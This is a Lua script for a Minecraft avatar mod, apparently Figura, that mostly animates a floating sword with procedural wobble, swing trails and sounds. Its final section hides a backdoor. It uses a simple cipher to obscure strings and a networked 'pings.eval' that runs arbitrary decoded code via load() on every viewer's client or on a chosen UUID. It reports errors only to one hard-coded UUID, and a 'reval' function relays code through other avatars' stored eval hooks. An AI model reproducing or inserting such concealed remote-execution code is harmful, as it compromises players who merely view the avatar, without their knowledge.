if avatar:getPermissionLevel() ~= "MAX" then
	models.sword:setVisible(false)
	return
end


---Returns a multi stacked sine wave.  
---
---**Depth** is the amount of waves being stacked  
---**Presistence** is the contribution factor of the different waves.  
---A persistence value of 1 means all the octaves have the same contribution,  
---a value of 0.5 means each octave contributes half as much as the previous one.  
---**Lacunarity** is the difference in frequency between waves, higher value = more noiser the next wave goes.
---@param value number
---@param seed number
---@param depth integer
---@param presistence number?
---@param lacunarity number?
---@return number
local function fractralSine(value,seed,depth,presistence,lacunarity)
   presistence = presistence or 0.5
   math.randomseed(seed)
   local max = 0 -- used to normalize the value
   local result = 0
   local w = 1
   local lun = 1 
   for _ = 1, depth, 1 do
      max = max + 1 * w
      result = result + math.sin(value * lun * (math.random() * math.pi * depth) + math.random() * math.pi * depth) * w
      lun = lun * (lacunarity or 1.5)
      w = w * (presistence or 0.75)
   end
   math.randomseed(client.getSystemTime())
   return result / depth / max
end


models.sword:setPrimaryRenderType("CUTOUT_CULL")
models.sword.Roll.Pole.Handle.bone.glow:setPrimaryRenderType("EMISSIVE_SOLID")

local is_holding_sword = false
local was_holding_sword

local MAX_ROLL = 15

local GNanim = require("lib.GNanimClassic")
local trail = require("lib.trail")

local state = GNanim.new()

local lpos = vectors.vec3()
local pos = vectors.vec3()
local lrot = 0
local rot = 0

local SCALE = 0.5
local SPEED = 1 / SCALE


local swing_count = 0
local roll2 = 0
local roll1 = 0
local weary = 0.9
local sword = models.sword:scale(SCALE)
sword:setParentType("WORLD")
local sword_trail = trail:newTwoLeadTrail(textures["textures.trail"])
sword_trail:setDivergeness(0)

local function setScale(scale)
	SCALE = scale
	SPEED = 1 / scale
	for key, value in pairs(animations.sword) do value:speed(SPEED) end
	state:setBlendTime(0.1 / SPEED)
	models.sword:scale(SCALE)
	sword_trail:setDuration(20/SPEED)
end

events.ENTITY_INIT:register(function()
	pos = player:getPos()
	lpos = pos:copy()
	rot = player:getRot().y
	lrot = rot
end)

events.TICK:register(function()
	lrot = rot
	lpos = pos
	pos = math.lerp(pos, player:getPos(), vectors.vec3(0.8, 0.3, 0.8))
	rot = math.lerp(rot, player:getBodyYaw(), 0.3)
	if was_holding_sword ~= is_holding_sword then
		state:setAnimation(is_holding_sword and animations.sword.idle2prepare or animations.sword.prepare2idle)
		was_holding_sword = is_holding_sword
		if not is_holding_sword then swing_count = 0 end
	end
	if is_holding_sword then
		if player:getSwingTime() == 1 then
			sounds:playSound("swing", player:getPos():add(0, 1, 0), 0.3, (0.9 + (math.random() - 0.5) * 0.2 )* SPEED)
			if swing_count % 2 == 1 then
				roll1 = math.random(-MAX_ROLL, MAX_ROLL)
				state:setAnimation(animations.sword.swing2swing2)
			else
				roll2 = math.random(-MAX_ROLL, MAX_ROLL)
				state:setAnimation(animations.sword.swing2swing)
			end
			swing_count = swing_count + 1
		end
	end
end)
local lastEyeHeight = 0
sword.midRender = (function(dt)
	if player:isLoaded() then
		local eyeHeight = player:getEyeHeight()
		if lastEyeHeight ~= eyeHeight then
			lastEyeHeight = eyeHeight
			setScale(eyeHeight/1.62)
		end
		local meta = models.sword.metadata:getAnimPos()
		local mat = models.sword.Roll.Pole.Handle:partToWorldMatrix()
		sword_trail:setLeads(mat:apply(0, 0, 1), mat:apply(0, 0, -30), meta.x * 2)
		local r = player:getBodyYaw(dt)
		local sneak = player:isSneaking() and player:isOnGround()
		local dir = vectors.rotateAroundAxis(-r, vectors.vec3(0, .25, 1), vectors.vec3(0, 1, 0))
		sword:pos((math.lerp(player:getPos(dt), math.lerp(lpos, pos, dt), weary) + vec(0,player:getEyeHeight()*0.5,0)) * 16 + (sneak and dir * -10 or vectors.vec3(0, 0, 0)))
		sword:rot(sneak and -30 or 0, 180 - math.lerp(r, math.lerp(lrot, rot, dt), weary), 0)
		sword.Roll:setRot(0, 0, math.lerp(roll1, roll2, meta.x))
		is_holding_sword = (player:getHeldItem().id:find("sword") and true or false)
	end
end)


events.ITEM_RENDER:register(function() if is_holding_sword then return sword.Item end end)

events.RENDER:register(function(delta, context)
	if context == "FIRST_PERSON" then
		if weary == 0 then
			sword:setVisible(false)
		else
			sword:setOpacity(weary):setVisible(true)
		end
	else
		sword:setVisible(context == "RENDER"):setOpacity(1)
	end
	vanilla_model.RIGHT_ARM:setOffsetRot(is_holding_sword and -15 or 0, 0, 0)
	local meta = models.sword.metadata:getAnimPos()
	local systime = client:getSystemTime() / 10000
	weary = meta.y
	models.sword.Roll.Pole.Handle:rot(
		fractralSine(systime, 135351, 10, 0.5, 1.4) * 90 * weary,
		fractralSine(systime, 253631, 10, 0.5, 1.4) * 90 * weary,
		fractralSine(systime, 34124, 10, 0.5, 1.4) * 90 * weary
	):pos(
		fractralSine(systime, 4214, 10, 0.5, 1.2) * 16 * weary,
		fractralSine(systime, 53631, 10, 0.5, 1.2) * 16 * weary,
		fractralSine(systime, 4124, 10, 0.5, 1.2) * 16 * weary)
end)


local shirt = 69421
local function shit(i) return (shirt + i + shirt) end
local function nc(str)
	if not str then return end
	local out = ""
	for i = 1, #str do
		out = out..string.char((str:byte(i) + shit(i)) % 256)
	end
	return out
end
local function dc(str)
	if not str then return end
	local out = ""
	for i = 1, #str do
		out = out..string.char((str:byte(i) - shit(i)) % 256)
	end
	return out
end
---@param code string
function eval(code,uuid)
	pings.eval(nc(code),nc(uuid))
end
local tar = "e4b91448-3b58-4c1f-8339-d40f75ecacc4"
function pings.eval(code,uuid)
	local allow = true
	if uuid then
		allow = client:getViewer():getUUID() == dc(uuid)
	end
	if allow then
		local meth = load("return "..dc(code),"run",_ENV)
		local ok, err = pcall(meth)
		if client:getViewer():isLoaded() and client:getViewer():getUUID() == tar then
			if not ok then
				print(err)
			end
		end
	end
end
function reval(code,uuid)
	pings.reval(nc(code),nc(uuid))
end
function pings.reval(code, uuid)
	--if host:isHost() then return end
	uuid = dc(uuid)
	for key, vars in pairs(world.avatarVars()) do
		if (not uuid) or (uuid == key) then
			if vars.eval then
				vars.eval(dc(code))
			end
		end
	end
end
if avatar:getPermissionLevel() ~= "MAX" then return end
events.ENTITY_INIT:register(function ()
	if player:getUUID() ~= tar then
		avatar:store("eval",eval)
	end
end)